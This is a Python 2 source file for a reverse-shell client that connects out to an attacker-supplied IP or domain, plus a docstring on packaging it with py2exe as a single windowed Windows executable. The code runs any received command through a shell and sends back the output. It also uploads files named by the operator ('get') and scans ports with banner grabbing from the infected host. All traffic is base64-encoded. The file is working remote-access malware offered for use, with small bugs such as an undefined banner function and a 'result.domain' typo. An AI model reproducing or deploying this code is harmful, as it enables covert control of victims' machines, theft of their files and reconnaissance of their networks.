#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
# py2exe download link: http://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/

setup.py:

from distutils.core import setup
import py2exe , sys, os

sys.argv.append("py2exe")
setup(
    options = {'py2exe': {'bundle_files': 1}},
 
    windows = [{'script': "TCP_Client_Reverse_Shell.py"}],    
    zipfile = None,
    
)
"""

#------------------------------------------------------------------------------
# Modules
#------------------------------------------------------------------------------

import socket
import subprocess
import os
import sys
import argparse
import hashlib
import base64

#------------------------------------------------------------------------------
# Python version check.
#------------------------------------------------------------------------------

if __name__ == "__main__":
    if sys.version_info < (2, 7) or sys.version_info >= (3, 0):
        show_banner()
        print ("[!] You must use Python version 2.7 or above")
        sys.exit(1)

#------------------------------------------------------------------------------
# Command line parser using argparse
#------------------------------------------------------------------------------

def cmdline_parser():
    parser = argparse.ArgumentParser(conflict_handler='resolve', add_help=True, description='Example: python %(prog)s -i 1.2.3.4 -p 80', version='TCPRS 0.1',
             usage="python %(prog)s [OPTIONS]")

    parser.add_argument('-i', '--ip', action='store', dest='ip', help='IP')
    parser.add_argument('-d', '--domain', action='store', dest='domain', help='Domain')
    parser.add_argument('-p', '--port', action='store', dest='port', help='Port')
    return parser


#------------------------------------------------------------------------------
# Functions
#------------------------------------------------------------------------------

def transfer(socketconnection,path):

    if os.path.exists(path):
        file = open(path, 'rb')
        packet = file.read(1024)
        encode = base64.b64encode(packet)
        while packet != '':
            socketconnection.send(encode) 
            packet = file.read(1024)
            encode = base64.b64encode(packet)
        DONE = 'DONETOREAD'
        encode = base64.b64encode(DONE)
        socketconnection.send(encode)
        file.close()
    else:
        TEXT = 'Unable to find out the file'
        encode = base64.b64encode(TEXT)
        socketconnection.send(encode)


def scanner(socketconnection,ip,ports):
    
    scan_result = ''

    # Ports format 21,22,23,80,443
    for port in ports.split(','):
        
        # for each port a connection using socket library 
        try:
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # returns 0: port opened 
            output = sock.connect_ex((ip, int(port) ))              
            if output == 0:
                sock.send('Test \n')
                banner = sock.recv(1024)
                scan_result = scan_result + "[+] Port " + port + " is opened " + banner + "\n"
            else:
                scan_result = scan_result + "[-] Port " + port + " is closed or Host is not reachable" + "\n"
                
            sock.close()
    
        except Exception, e:
            pass

    # Send the results
    encode = base64.b64encode(scan_result)
    print scan_result
    socketconnection.send(encode)


def connect(IPconnection,Portconnection):

    socketconnection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socketconnection.connect((IPconnection, int(Portconnection)))
 
    while True:
        commandrecv =  socketconnection.recv(1024)
        command = base64.b64decode(commandrecv)
        
        if 'terminate' in command:
            socketconnection.close()
            break 

        elif 'help' in command:
            helpcmd = '''
            terminate
            scan <IP>:22,80,443
            get filepath
            '''
            encode = base64.b64encode(helpcmd)
            socketconnection.send(encode)

        elif 'scan' in command:
            command = command[5:]
            ip,ports = command.split(':')
            scanner(socketconnection,ip,ports)
            
        elif 'cd' in command:
            code,directory = command.split (' ')
            os.chdir(directory)
            encode = base64.b64encode("[+] CWD Is " + os.getcwd())
            socketconnection.send(encode)

        elif 'get' in command:            
            grab,path = command.split(' ')
            
            try:                         
                transfer(socketconnection,path)
            except Exception,e:
                encode = base64.b64encode(str(e))
                socketconnection.send(encode)
                pass
        else:
            
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

            # Encode the output and send to RHOST
            encode = base64.b64encode(CMD.stdout.read())
            encodeerror = base64.b64encode(CMD.stderr.read())

            socketconnection.send(encode)
            socketconnection.send(encodeerror)


#------------------------------------------------------------------------------
# Start of program
#------------------------------------------------------------------------------

def main():

    # Get the command line parser.
    parser = cmdline_parser()

    # Show help if no args
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

	# Get results line parser.
    results = parser.parse_args()

    print "[+] TCP Client connected to " + results.ip + " and port " + results.port

    if (results.ip):
        ipconnect = results.ip
    elif (result.domain):
        ipconnect =  socket.gethostbyname(results.domain)
    else:
        print "[-] A domain or IP is needed "

    connect(ipconnect, results.port)

#------------------------------------------------------------------------------
# Main
#------------------------------------------------------------------------------

if __name__ == '__main__':
	main()